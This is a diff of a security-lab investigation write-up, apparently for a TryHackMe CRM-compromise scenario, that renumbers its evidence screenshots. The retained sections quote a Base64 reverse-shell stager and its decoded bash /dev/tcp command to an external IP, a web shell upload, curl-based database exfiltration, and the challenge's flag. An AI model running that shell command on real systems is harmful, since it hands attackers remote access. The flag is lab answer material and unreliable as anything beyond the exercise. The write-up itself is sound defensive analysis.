@@ -56,33 +56,29 @@ A critical compromise of production CRM server `TPMHQ-CRM01` running on Ubuntu 2
 TryHackMe Portal Drop investigation completion dashboard confirming all investigative questions answered, 100% scenario completion, and full 400-point capture:
 ![TryHackMe Portal Drop Completion](screenshots/01-tryhackme-portal-drop-completion.png)
 
-#### Evidence 2: EDR Detection Queue & Multi-Host Telemetry
-TryDetectMe XDR Activity Dashboard displaying the 4 correlated security alerts across `TPMHQ-CRM01` and `TMPEU-UATSERVER`:
-![EDR Alert Queue Dashboard](screenshots/02-edr-alert-queue-dashboard.png)
-
-#### Evidence 3: Web Shell Drop & Execution Telemetry in Splunk
+#### Evidence 2: Web Shell Drop & Execution Telemetry in Splunk
 Splunk search capturing attacker IP `34.67.91[.]83` leveraging `python-requests/2.31.0` to upload `invoice.php` via `upload.php` and invoke execution commands:
-![Splunk Web Shell Upload](screenshots/03-splunk-access-logs-webshell-upload.png)
+![Splunk Web Shell Upload](screenshots/02-splunk-access-logs-webshell-upload.png)
 
-#### Evidence 4: Reverse Shell Stager De-Obfuscation via Decodora (Custom Analyst Tool)
+#### Evidence 3: Reverse Shell Stager De-Obfuscation via Decodora (Custom Analyst Tool)
 Decoding the Base64 payload `YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTUuNTguMTQ4Ljg2LzgwODAgMD4mMQ==` offline using **[Decodora](https://mahialjaber.github.io/Decodora/)**, exposing the active interactive reverse shell payload targeting `115.58.148[.]86:8080`:
-![Decodora Decoded Reverse Shell](screenshots/04-decodora-decoded-reverse-shell.png)
+![Decodora Decoded Reverse Shell](screenshots/03-decodora-decoded-reverse-shell.png)
 
-#### Evidence 5: EDR Parent-Child Anomaly – Interactive Shell Spawn
+#### Evidence 4: EDR Parent-Child Anomaly – Interactive Shell Spawn
 TryDetectMe XDR alert capturing the illegal execution lineage where `/usr/sbin/php-fpm7.4` spawned `/bin/bash` with argument `-c "bash -i >& /dev/tcp/115.58.148.86/8080 0>&1"`:
-![EDR Shell Spawn Reverse Shell](screenshots/05-edr-shell-spawn-reverse-shell.png)
+![EDR Shell Spawn Reverse Shell](screenshots/04-edr-shell-spawn-reverse-shell.png)
 
-#### Evidence 6: VirusTotal Threat Intelligence on Reverse Shell Listener
+#### Evidence 5: VirusTotal Threat Intelligence on Reverse Shell Listener
 CTI enrichment for `115.58.148[.]86` confirming multiple security vendors flagging the host as malicious malware infrastructure originating from China Unicom Backbone:
-![VirusTotal C2 Reputation](screenshots/06-virustotal-c2-reputation.png)
+![VirusTotal C2 Reputation](screenshots/05-virustotal-c2-reputation.png)
 
-#### Evidence 7: Production Database Exfiltration via curl
+#### Evidence 6: Production Database Exfiltration via curl
 Process and network telemetry capturing the unauthorized outbound upload of `/var/lib/trycrm/prod.db` and `/var/lib/trycrm/prod.idx` to staging domain `portaldrop2025[.]xyz`:
-![EDR Data Exfiltration via curl](screenshots/07-edr-data-exfiltration-curl.png)
+![EDR Data Exfiltration via curl](screenshots/06-edr-data-exfiltration-curl.png)
 
-#### Evidence 8: Web Shell Quarantine & Challenge Flag Capture
+#### Evidence 7: Web Shell Quarantine & Challenge Flag Capture
 Remediation confirmation showing file collection and quarantine of `/var/www/html/CRM/portal/uploads/invoice.php`, rewarding challenge flag `THM{p0rtal_dropp3d?}`:
-![EDR Flag Capture Remediation](screenshots/08-edr-flag-capture-remediation.png)
+![EDR Flag Capture Remediation](screenshots/07-edr-flag-capture-remediation.png)
 
 ---
 
